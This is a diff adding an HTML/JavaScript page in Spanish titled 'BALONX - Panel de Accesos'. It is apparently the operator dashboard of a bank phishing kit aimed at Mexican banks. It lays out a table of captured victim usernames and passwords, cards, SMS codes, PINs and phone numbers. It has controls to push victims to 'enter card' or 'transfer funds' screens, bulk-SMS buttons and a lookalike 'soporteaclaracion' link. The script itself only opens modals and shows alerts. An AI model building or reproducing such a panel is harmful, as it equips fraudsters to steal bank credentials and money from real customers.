@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>BALONX - Panel de Accesos</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #121212;
+      color: white;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+    }
+    .sidebar {
+      width: 220px;
+      background-color: #1f1f1f;
+      padding: 20px;
+      height: 100vh;
+    }
+    .sidebar .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .sidebar .logo img {
+      width: 60px;
+      border-radius: 50%;
+    }
+    .sidebar h3 {
+      text-align: center;
+      font-size: 16px;
+      color: #ccc;
+      margin: 10px 0 5px;
+    }
+    .nav a {
+      display: block;
+      color: white;
+      text-decoration: none;
+      background-color: #2c2c2c;
+      border-radius: 6px;
+      margin: 10px 0;
+      padding: 10px;
+    }
+    .nav a.active {
+      background-color: #007bff;
+    }
+    .main {
+      flex: 1;
+      padding: 30px;
+    }
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .header .actions button {
+      background-color: #007bff;
+      border: none;
+      color: white;
+      padding: 8px 14px;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-left: 10px;
+    }
+    .panel-info {
+      background-color: #1e1e1e;
+      padding: 15px;
+      margin: 25px 0;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-radius: 8px;
+    }
+    .panel-info a {
+      color: #00aaff;
+    }
+    select {
+      padding: 10px;
+      border-radius: 6px;
+      background-color: #2c2c2c;
+      color: white;
+      border: 1px solid #444;
+      font-size: 14px;
+    }
+    .tabs {
+      display: flex;
+      gap: 20px;
+      margin-bottom: 10px;
+    }
+    .tab {
+      cursor: pointer;
+      padding-bottom: 5px;
+      border-bottom: 2px solid transparent;
+    }
+    .tab.active {
+      border-color: #00aaff;
+      color: #00aaff;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      background-color: #1e1e1e;
+    }
+    th, td {
+      padding: 10px;
+      border-bottom: 1px solid #2c2c2c;
+      color: #ccc;
+    }
+    th {
+      background-color: #222;
+      color: white;
+  }
+  </style>
+</head>
+<body>
+  <div class="sidebar">
+    <div class="logo">
+      <img src="A_modern_logo_design_for_'BALONX'_with_a_cyberneti.png" alt="Logo BALONX" />
+      <h3>Jefthe Zout</h3>
+      <p style="font-size: 12px; color: gray;">Normal</p>
+    </div>
+    <div class="nav">
+      <a href="#" class="active">Accesos</a>
+    </div>
+  </div>
+
+  <div class="main">
+    <div class="header">
+      <div>
+        <p style="color:#00aaff;">Panel / Accesos</p>
+        <h1>Panel Accesos</h1>
+        <div style="margin-top: 10px;">
+          <label for="pantallaControl" style="font-size: 14px; color: #ccc;">Acciones / Control de Pantalla:</label>
+          <select id="pantallaControl" onchange="cambiarPantalla()">
+            <option value="">Selecciona una opción</option>
+            <option value="login">1. Login</option>
+            <option value="codigo">2. Código de verificación</option>
+            <option value="nip">3. NIP</option>
+            <option value="protege">4. Protege tu información</option>
+            <option value="tarjeta">5. Ingresa tarjeta</option>
+            <option value="transferir">6. Transfiere fondos</option>
+            <option value="cancelacion">7. Cancelación exitosa</option>
+            <option value="mensaje">8. Ingresa el mensaje que gustes</option>
+          </select>
+        </div>
+      </div>
+      <div class="actions">
+        <button>Bulk SMS</button>
+        <button>Enviar SMS</button>
+      </div>
+    </div>
+
+    <div class="panel-info">
+      <span><strong>Liga activa:</strong> <a href="#">soporteaclaracion.com/5859525114</a></span>
+      <select id="filtroBanco">
+        <option value="todos">Todos los bancos</option>
+        <option value="LIVERPOOL">LIVERPOOL</option>
+        <option value="Amex">Amex</option>
+        <option value="BanBajío">BanBajío</option>
+        <option value="BanCoppel">BanCoppel</option>
+        <option value="Banorte">Banorte</option>
+        <option value="Banregio">Banregio</option>
+        <option value="BBVA">BBVA</option>
+        <option value="Citibanamex">Citibanamex</option>
+        <option value="HSBC">HSBC</option>
+        <option value="Invex" selected>Invex</option>
+        <option value="Santander">Santander</option>
+        <option value="Scotiabank">Scotiabank</option>
+        <option value="Spin">Spin</option>
+      </select>
+    </div>
+
+    <div class="tabs">
+      <div class="tab active">Accesos actuales</div>
+      <div class="tab">Accesos guardados</div>
+    </div>
+
+    <table id="tablaAccesos">
+      <thead>
+        <tr>
+          <th>#</th>
+          <th>Folio</th>
+          <th>User:Password</th>
+          <th>Banco</th>
+          <th>Tarjeta</th>
+          <th>SMS</th>
+          <th>NIP</th>
+          <th>SMS COMPRA</th>
+          <th>Celular</th>
+          <th>Paso actual</th>
+          <th>Acciones</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr data-banco="Invex">
+          <td>1</td><td>123</td><td>juan:1234</td><td>Invex</td><td>****</td><td>--</td><td>--</td><td>--</td><td>--</td><td>Login</td><td>--</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- MODALES ORIGINALES Y NUEVOS -->
+
+  <!-- Proteger -->
+  <div id="modalProteger" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); z-index:9999; justify-content:center; align-items:center;">
+    <div style="background:#2c2c2c; padding:25px; border-radius:10px; width:320px; color:white; position:relative;">
+      <h3>Proteger Saldo</h3>
+      <label for="cantidadProteger">Cantidad $</label>
+      <input id="cantidadProteger" type="number" placeholder="Ingrese la cantidad" style="width:100%; padding:10px; margin-bottom:20px; border:none; border-radius:6px; background:#1f1f1f; color:white;">
+      <div style="display:flex; justify-content:flex-end; gap:10px;">
+        <button onclick="confirmarProteccion()" style="background:#007bff; border:none; color:white; padding:8px 14px; border-radius:5px;">Continuar</button>
+        <button onclick="cerrarModalProteger()" style="background:#666; border:none; color:white; padding:8px 14px; border-radius:5px;">Cancelar</button>
+      </div>
+      <div onclick="cerrarModalProteger()" style="position:absolute; top:10px; right:10px; cursor:pointer;">&times;</div>
+    </div>
+  </div>
+
+  <!-- Transferir -->
+  <div id="modalTransferir" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); z-index:9999; justify-content:center; align-items:center;">
+    <div style="background:#2c2c2c; padding:25px; border-radius:10px; width:400px; color:white; position:relative;">
+      <h3>Transferir</h3>
+      <input id="transferCantidad" type="number" placeholder="Ingrese la cantidad" style="width:100%; margin-bottom:10px; padding:10px;">
+      <input id="transferTitular" type="text" placeholder="Ingrese el titular" style="width:100%; margin-bottom:10px; padding:10px;">
+      <input id="transferClabe" type="text" placeholder="Ingrese la CLABE" style="width:100%; margin-bottom:10px; padding:10px;">
+      <input id="transferAlias" type="text" placeholder="Cuenta de respaldo" style="width:100%; margin-bottom:10px; padding:10px;">
+      <input id="transferQR" type="file" style="width:100%; margin-bottom:20px;">
+      <div style="display:flex; justify-content:flex-end; gap:10px;">
+        <button onclick="confirmarTransferencia()" style="background:#007bff; border:none; color:white; padding:8px 14px; border-radius:5px;">Continuar</button>
+        <button onclick="cerrarModalTransferir()" style="background:#666; border:none; color:white; padding:8px 14px; border-radius:5px;">Cancelar</button>
+      </div>
+      <div onclick="cerrarModalTransferir()" style="position:absolute; top:10px; right:10px; cursor:pointer;">&times;</div>
+    </div>
+  </div>
+
+  <!-- Cancelación -->
+  <div id="modalCancelacion" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); z-index:9999; justify-content:center; align-items:center;">
+    <div style="background:#2c2c2c; padding:25px; border-radius:10px; width:340px; color:white; position:relative;">
+      <h3>Cancelación</h3>
+      <input id="cancelacionImporte" type="number" placeholder="Ingrese el importe" style="width:100%; margin-bottom:10px; padding:10px;">
+      <input id="cancelacionNegocio" type="text" placeholder="Ingrese el negocio" style="width:100%; margin-bottom:20px; padding:10px;">
+      <div style="display:flex; justify-content:flex-end; gap:10px;">
+        <button onclick="confirmarCancelacion()" style="background:#007bff; border:none; color:white; padding:8px 14px; border-radius:5px;">Continuar</button>
+        <button onclick="cerrarModalCancelacion()" style="background:#666; border:none; color:white; padding:8px 14px; border-radius:5px;">Cancelar</button>
+      </div>
+      <div onclick="cerrarModalCancelacion()" style="position:absolute; top:10px; right:10px; cursor:pointer;">&times;</div>
+    </div>
+  </div>
+
+  <!-- Código (Teléfono) -->
+  <div id="modalCodigo" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); z-index:9999; justify-content:center; align-items:center;">
+    <div style="background:#2c2c2c; padding:25px; border-radius:10px; width:300px; color:white; position:relative;">
+      <h3>Teléfono</h3>
+      <label for="telefonoCodigo">Ingresa tu número celular:</label>
+      <input id="telefonoCodigo" type="tel" maxlength="10" placeholder="10 dígitos" style="width:100%; padding:10px; margin:10px 0; border:none; border-radius:6px; background:#1f1f1f; color:white;">
+      <div style="display:flex; justify-content:flex-end; gap:10px;">
+        <button onclick="confirmarTelefonoCodigo()" style="background:#007bff; border:none; color:white; padding:8px 14px; border-radius:5px;">Aceptar</button>
+        <button onclick="cerrarModalCodigo()" style="background:#666; border:none; color:white; padding:8px 14px; border-radius:5px;">Cancelar</button>
+      </div>
+      <div onclick="cerrarModalCodigo()" style="position:absolute; top:10px; right:10px; cursor:pointer;">&times;</div>
+    </div>
+  </div>
+
+  <!-- Mensaje personalizado -->
+  <div id="modalMensaje" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); z-index:9999; justify-content:center; align-items:center;">
+    <div style="background:#2c2c2c; padding:25px; border-radius:10px; width:360px; color:white; position:relative;">
+      <h3>Mensaje personalizado</h3>
+      <label for="mensajeTexto">Escribe el mensaje (máx. 300 caracteres):</label>
+      <textarea id="mensajeTexto" maxlength="300" rows="5" style="width:100%; padding:10px; margin:10px 0; border:none; border-radius:6px; background:#1f1f1f; color:white;"></textarea>
+      <div style="display:flex; justify-content:flex-end; gap:10px;">
+        <button onclick="confirmarMensaje()" style="background:#007bff; border:none; color:white; padding:8px 14px; border-radius:5px;">Enviar</button>
+        <button onclick="cerrarModalMensaje()" style="background:#666; border:none; color:white; padding:8px 14px; border-radius:5px;">Cancelar</button>
+      </div>
+      <div onclick="cerrarModalMensaje()" style="position:absolute; top:10px; right:10px; cursor:pointer;">&times;</div>
+    </div>
+  </div>
+
+  <script>
+    function cambiarPantalla() {
+      const opcion = document.getElementById("pantallaControl").value;
+      switch(opcion) {
+        case "protege":
+          abrirModalProteger();
+          break;
+        case "transferir":
+          abrirModalTransferir();
+          break;
+        case "cancelacion":
+          abrirModalCancelacion();
+          break;
+        case "codigo":
+          abrirModalCodigo();
+          break;
+        case "mensaje":
+          abrirModalMensaje();
+          break;
+        default:
+          alert("Cambio de pantalla a: " + opcion);
+      }
+    }
+
+    function abrirModalProteger() {
+      document.getElementById("modalProteger").style.display = "flex";
+    }
+    function cerrarModalProteger() {
+      document.getElementById("modalProteger").style.display = "none";
+    }
+    function confirmarProteccion() {
+      const cantidad = document.getElementById("cantidadProteger").value;
+      alert("Cantidad protegida: $" + cantidad);
+      cerrarModalProteger();
+    }
+
+    function abrirModalTransferir() {
+      document.getElementById("modalTransferir").style.display = "flex";
+    }
+    function cerrarModalTransferir() {
+      document.getElementById("modalTransferir").style.display = "none";
+    }
+    function confirmarTransferencia() {
+      const cantidad = document.getElementById("transferCantidad").value;
+      const titular = document.getElementById("transferTitular").value;
+      const clabe = document.getElementById("transferClabe").value;
+      alert(`Transferencia a ${titular} por $${cantidad} (CLABE: ${clabe})`);
+      cerrarModalTransferir();
+    }
+
+    function abrirModalCancelacion() {
+      document.getElementById("modalCancelacion").style.display = "flex";
+    }
+    function cerrarModalCancelacion() {
+      document.getElementById("modalCancelacion").style.display = "none";
+    }
+    function confirmarCancelacion() {
+      const monto = document.getElementById("cancelacionImporte").value;
+      const negocio = document.getElementById("cancelacionNegocio").value;
+      alert(`Cancelación de $${monto} en ${negocio}`);
+      cerrarModalCancelacion();
+    }
+
+    function abrirModalCodigo() {
+      document.getElementById("modalCodigo").style.display = "flex";
+    }
+    function cerrarModalCodigo() {
+      document.getElementById("modalCodigo").style.display = "none";
+    }
+    function confirmarTelefonoCodigo() {
+      const telefono = document.getElementById("telefonoCodigo").value;
+      alert("Teléfono ingresado: " + telefono);
+      cerrarModalCodigo();
+    }
+
+    function abrirModalMensaje() {
+      document.getElementById("modalMensaje").style.display = "flex";
+    }
+    function cerrarModalMensaje() {
+      document.getElementById("modalMensaje").style.display = "none";
+    }
+    function confirmarMensaje() {
+      const mensaje = document.getElementById("mensajeTexto").value;
+      alert("Mensaje enviado: " + mensaje);
+      cerrarModalMensaje();
+    }
+
+    document.getElementById("filtroBanco").addEventListener("change", function () {
+      const bancoSeleccionado = this.value;
+      document.querySelectorAll("#tablaAccesos tbody tr").forEach(fila => {
+        const banco = fila.getAttribute("data-banco");
+        fila.style.display = bancoSeleccionado === "todos" || banco === bancoSeleccionado ? "" : "none";
+      });
+    });
+  </script>
+</body>
+</html>
